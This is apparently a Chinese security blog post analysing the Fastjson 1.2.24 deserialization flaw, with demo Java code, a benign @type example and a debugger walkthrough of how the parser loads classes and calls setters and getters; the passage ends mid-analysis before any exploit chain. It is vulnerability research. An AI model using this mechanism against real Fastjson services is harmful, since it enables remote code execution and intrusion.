<!-- build time:Sun Jan 21 2024 17:02:30 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="FastJson"><link rel="canonical" href="https://blog.xcu.icu/2023/10/14/java%E5%AE%89%E5%85%A8/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><title>FastJson漏洞分析 - java安全 | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">FastJson漏洞分析</h1><div class="meta"><span class="item" title="创建时间：2023-10-14 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-10-14T00:00:00+08:00">2023-10-14</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>22k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>20 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/3.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/105.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/57.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/124.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/94.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/98.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/java%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 java安全"><span itemprop="name">java安全</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2023/10/14/java%E5%AE%89%E5%85%A8/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>Fastjson 漏洞从 17 年爆出来到现在 6 年的时间，早已经不是一个新鲜的东西，但是还是比较多的，网上各个师傅们的各种记录我也看的算是比较多了，这里也简单记录一下，跟踪一下各个利用链和原理，本篇中所涉及的代码都在 https://github.com/clown-q/Clown_java 中</p><h2 id="fastjson"><a class="anchor" href="#fastjson">#</a> Fastjson</h2><p>还是老规矩，首先来说明一下什么是 Fastjson，Fastjson 是一个阿里巴巴的一个 Java 库，根据阿里巴巴 fastjson 项目中的介绍，这个 java 库 “可用于将 Java 对象转换为其 JSON 表示形式。它还可用于将 JSON 字符串转换为等效的 Java 对象。Fastjson 可以使用任意 Java 对象， <code>包括您没有源代码的预先存在的对象</code> ”。</p><p>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvZmFzdGpzb24=">阿里巴巴 / FASTJSON (github.com)</span></p><p>导入 maven 依赖，这里使用的是最开始官方主动爆出漏洞的版本</p><figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">&lt;!--fastjson--></span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>这样就可以开始使用 fastjson 了，常用的有两种处理 JSON 的方法</p><ul><li><code>JSON.parseObject()</code> 方法：将 <code>JSON</code> 字符串转换成对象。</li><li><code>JSON.toJSONString()</code> 方法：可将对象转换成 <code>JSON</code> 字符串</li></ul><p>下面通过一个简单的例子来展示一下两个 方法的使用</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">//        必须有无参的构造方法，以便 JSON 库能够实例化对象</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">return</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">return</span> age<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"Test&#123;"</span> <span class="token operator">+</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>上面这段代码是测试类，然后下面是 JSON.parseObject () 方法的 demo</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastjsonTest</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"name\":\"aaa\",\"age\":18&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">Test</span> test <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008144339360.png" alt="image-20231008144339360"></p><p>可以看到这里实际上是调用了两个 set 方法来将 JSON 字符串解析为 Java 对象，下面是 JSON.toJSONString 方法的 demo</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastjsonTest</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//        String str = "&#123;\"name\":\"aaa\",\"age\":18&#125;";</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//        Test test = JSON.parseObject(str, Test.class);</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">//        System.out.println(test.toString());</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token class-name">Test</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008144731153.png" alt="image-20231008144731153"></p><p>这里可以看到实际上它调用了两个对应的 get 方法</p><h2 id="漏洞产生根源"><a class="anchor" href="#漏洞产生根源">#</a> 漏洞产生根源</h2><p>在 Fastjson 中，我们可以使用 @type 来指定一个类，像下面这种写法</p><figure class="highlight json"><figcaption data-lang="JSON"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"Fastjson.Test"</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>接着看下面这个例子</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastjsonTest</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"Fastjson.Test\",\"name\":\"aaa\",\"age\":18&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonObject<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里指定的类还是上面使用过的 test 类</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008152753188.png" alt="image-20231008152753188"></p><p>在这个过程中，它将类的构造方法和 set，get 方法都调用了一遍，其实漏洞点就已经很明显了，如果在这个 JSON 接口传入恶意的 JSON，就可以调用任意类的构造方法已经相关的 set 和 get 方法。</p><h3 id="调试分析"><a class="anchor" href="#调试分析">#</a> 调试分析</h3><p>先扔张流程图</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231012142450624.png" alt="image-20231012142450624"></p><p>这里简单调试一下，看一下 set、get 方法是怎么被调用的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008154106615.png" alt="image-20231008154106615"></p><p>在这个位置下一个断点</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008154148305.png" alt="image-20231008154148305"></p><p>因为这里只传入了一个字符串，所以这里调用了一个参数类型为 String 的 parseObject 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008154252523.png" alt="image-20231008154252523"> 在当前类中，接收不同参数的同名方法其实很多，在当前方法中会首先调用一个 parse 方法解析，然后得到一个 Object，这里跟进看一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008155217530.png" alt="image-20231008155217530"></p><p>调用了本类的同名方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008155253687.png" alt="image-20231008155253687"></p><p>这里判断一下传入的字符串是否为空，如果为空直接返回 null，如果非空，会选用一个解析器，然后接着调用 parse 方法，我们跟进到这个 parse 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008155801921.png" alt="image-20231008155801921"></p><p>这里可以看到走到了 DefaultJSONParser 的 parse 方法里，在该方法中使用了一个 switch 来做一个匹配</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008160627944.png" alt="image-20231008160627944"></p><p>传入的第一个字符是 {，这里会创建一个新的 JSONObject 对象，然后调用了一个 parseObject 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008160900653.png" alt="image-20231008160900653"></p><p>这个方法中的代码很长，这里就不贴出来了，穿插着说一下整个方法的逻辑</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008161141089.png" alt="image-20231008161141089"></p><p>主要的代码就是这个 try 语句中的这个死循环</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008161319978.png" alt="image-20231008161319978"></p><p>这里第一个 if 实际上是为了在启用特定特性的情况下，允许 JSON 数据中存在额外的逗号，并在解析时跳过这些额外的逗号，以提高鲁棒性。</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008161538883.png" alt="image-20231008161538883"></p><p>这个 if 识别了一个双引号，然后获取到下一个双引号之间的值，就是获取 key 的值</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008162253974.png" alt="image-20231008162253974"></p><p>获取完值后会进行一个判断，这里可以看到 JSON.<em>DEFAULT_TYPE_KEY</em> 实际上就是 @type，这里也是我们需要关注的点</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008162537044.png" alt="image-20231008162537044"></p><p>这里会使用 loadclass 去加载这个类，这里跟进一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008162627692.png" alt="image-20231008162627692"></p><p>这里可以看到，首先他会从缓存里面去找，如果没找到会进行其他的处理</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008162922009.png" alt="image-20231008162922009"></p><p>然后可以看到，这里实际上就已经加载目标类到缓存中了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008163315050.png" alt="image-20231008163315050"></p><p>最后这里先获取反序列化器，然后通过其来反序列化，这里跟进一下这里获取反序列化器的方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008164017424.png" alt="image-20231008164017424"></p><p>这里是通过缓存表去找，在 ParserConfig 的构造方法里会对应一下内置类的反序列化器</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008164140650.png" alt="image-20231008164140650"></p><p>因为这里是我们自己写的类，所以这里去缓存表里是查不到的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008164321166.png" alt="image-20231008164321166"></p><p>这里就会调用到 getDeserializer 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008164446216.png" alt="image-20231008164446216"></p><p>然后再这个方法中会各种匹配，这里说起来也比较麻烦，直接得到结论就是</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008164625688.png" alt="image-20231008164625688"></p><p>这里是创建了一个 Javabean 反序列化器，这里跟进该方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008170507613.png" alt="image-20231008170507613"></p><p>又是一段很长的代码逻辑，这里会首先判断是否启用了 asm 字节码生成和优化，然后判断是不是有自定义的序列化器等等一些判断，这些判断都不是我们关注的重点，我们直接看下面这个地方</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008170957428.png" alt="image-20231008170957428"></p><p>这是方法实际上是为了获取目标类的一些信息，这里就是比较重要的一块内容，我们跟进到这个方法中</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008171349926.png" alt="image-20231008171349926"></p><p>这里通过 getDeclaredFields 方法获取目标类的所有字段，通过 getMethods 获取所有的方法名，通过<em> getDefaultConstructor</em> 获取默认的构造方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008171809445.png" alt="image-20231008171809445"></p><p>然后就是对默认构造方法的一些判断，这里不重要，接着往下看后面对于方法的一些判断</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008172433387.png" alt="image-20231008172433387"></p><p>可以看到这里有三个循环，遍历了两遍 method，先看第一遍</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008171957755.png" alt="image-20231008171957755"></p><p>很显然这里是为了找到所有的 set 方法，这里其实是为了获取字段，这里将这些判断条件简单的总结一下</p><ol><li><code>methodName.length() &lt; 4</code> ：跳过方法名长度小于 4 的方法，以排除非 setter 方法。</li><li><code>Modifier.isStatic(method.getModifiers())</code> ：跳过静态方法。</li><li><code>!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))</code> ：跳过返回类型不是 <code>void</code> 或者返回类型与声明的类不同的方法。</li><li><code>types.length != 1</code> ：跳过参数个数不为 1 的方法。</li><li><code>annotation.deserialize() == false</code> ：跳过标记了 <code>JSONField</code> 注解且 <code>deserialize</code> 属性为 <code>false</code> 的方法。</li><li><code>methodName.startsWith(&quot;set&quot;)</code> ：只处理以 &quot;set&quot; 开头的方法，这是通常用于 setter 方法的命名规范。</li></ol><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008173517726.png" alt="image-20231008173517726"></p><p>判断结束后创建一个 <code>FieldInfo</code> 对象，用于表示 JavaBean 类中的一个字段或属性，包括字段的名称、类型、特性等信息，并将该对象添加到 <code>fieldList</code> 列表中。这个列表可能会包含 JavaBean 类中所有要映射的字段信息，以备后续的 JSON 反序列化过程使用</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008173712021.png" alt="image-20231008173712021"></p><p>然后第二个 for 循环去遍历所有的 public 字段，这里用的是前面的 test 类，实际上是没有 public 字段的，这里也不是重点</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008173841450.png" alt="image-20231008173841450"></p><p>然后这里的第三个 for 循环，它的作用也很明显就是为了找到所有的 get，这里同样简单总结一下</p><ol><li><code>methodName.length() &lt; 4</code> ：跳过方法名长度小于 4 的方法，通常是为了排除不符合 getter 方法命名规范的方法。</li><li><code>Modifier.isStatic(method.getModifiers())</code> ：跳过静态方法，因为 getter 方法通常是实例方法。</li><li><code>methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3))</code> ：检查方法名是否以 &quot;get&quot; 开头且第四个字符是大写字母。这是通常用于 getter 方法的命名规范。</li><li><code>method.getParameterTypes().length != 0</code> ：跳过带有参数的方法，因为 getter 方法不应该有参数。</li><li>检查方法的返回类型是否匹配特定类型，如 <code>Collection</code> 、 <code>Map</code> 、 <code>AtomicBoolean</code> 、 <code>AtomicInteger</code> 或 <code>AtomicLong</code> ，以确定这个方法可能用于表示 JavaBean 类中的属性。</li><li>检查 <code>fieldList</code> 中是否已经存在同名的属性，以避免重复添加。</li></ol><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008174506641.png" alt="image-20231008174506641"></p><p>最后调用够着函数，这里他的 fieldList 如下图</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231008174540642.png" alt="image-20231008174540642"></p><p>到这里类的信息就获取完了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009140046809.png" alt="image-20231009140046809"></p><p>这里获取完目标类的信息，赋值给 beanInfo，然后后面是一些判断，决定了 asmEnables 是否打开</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009140643334.png" alt="image-20231009140643334"></p><p>一系列的判断后，会根据这个 asmRnable 是否开启来判断一些操作，如果 asmEnale 是关闭的机会创建一个 JavaBeanDeserializer，这个是内置的一个 Deserializer</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009140913093.png" alt="image-20231009140913093"></p><p>否则，它会再一次调用 build 方法，然后用 asm 创建一个反序列化器，这里反序列化器算是有了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009142231366.png" alt="image-20231009142231366"></p><p>但是当前这个例子的反序列化器没法调试，因为这里是一个临时创建的类</p><h3 id="解决不能调试问题"><a class="anchor" href="#解决不能调试问题">#</a> 解决不能调试问题</h3><p>所以这里很显然就不能用 asm 创建反序列化器，所以就要将 asmRnable 开关打开</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231009143148446.png" alt="image-20231009143148446"></p><p>在前面 asmEnable 